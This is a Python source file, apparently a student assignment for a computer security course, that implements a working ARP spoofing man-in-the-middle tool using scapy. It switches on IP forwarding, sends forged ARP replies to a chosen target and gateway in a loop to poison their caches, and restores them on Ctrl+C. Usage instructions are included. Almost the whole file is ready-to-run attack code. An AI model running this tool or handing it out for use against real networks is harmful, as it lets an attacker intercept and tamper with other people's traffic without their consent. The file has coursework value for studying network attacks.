"""
 * Course     : Introduction to Computer Security
 * Supervisor : Dr. M.Mouzarani
 * Author     : Maryam Saeedmehr
 * Std.NO     : 9629373
 * Language   : python3

 + Man In The Middle Framework
    - Arp Spoofing attack

 + pre-requirements :
    ~$ pip3 install scapy

 + Optional arguments :
      -h, --help            show this help message and exit
      -t TARGET, --target TARGET
                            Specify target ip
      -g GATEWAY, --gateway GATEWAY
                            Specify gateway ip
    
 + e.g :
    ~$  python3 arp_spoofer.py -t 192.168.1.9 -g 192.168.1.1
"""
import scapy.all as scapy
import argparse
import time


def enable_ipforward():
    """
    Enables IP Forward in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == "1\n" or f.read() == "1":
            # already enabled
            print("[!] IP Forwarding has been enabled before.")
            time.sleep(2)
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        print("[!] Enabling IP Forwarding...")
        time.sleep(2)
        

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify gateway ip")
    return parser.parse_args()


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns `None` instead
    """
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """
    Spoofs `target_ip` saying that we are `spoof_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # send the packet
    scapy.send(packet, verbose=False, count=7)    


def restore(destination_ip, source_ip):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `source_ip` ) to `destination_ip`
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
    print("[+] Sent to {} : {} is-at {}".format(destination_ip, source_ip, source_mac))
    time.sleep(2)
        

if __name__ == "__main__":
    arguments = get_arguments()
    enable_ipforward()
    self_mac = scapy.ARP().hwsrc
    packet_count = 0
    try:
        print("[+] Sent to {} : {} is-at {}"
              .format(arguments.target, arguments.gateway, self_mac))
        print("[+] Sent to {} : {} is-at {}"
              .format(arguments.gateway, arguments.target, self_mac))
        while True:
            spoof(arguments.target, arguments.gateway)
            spoof(arguments.gateway, arguments.target)
            time.sleep(4)
            packet_count += 2
            print("\r[+] {} Packets has sent. press Ctrl + C to restore network..."
                  .format(packet_count), flush=True, end='')
            

    except KeyboardInterrupt:
        print("\n-----------------------------------------------------------------")
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(arguments.target, arguments.gateway)
        restore(arguments.gateway, arguments.target)
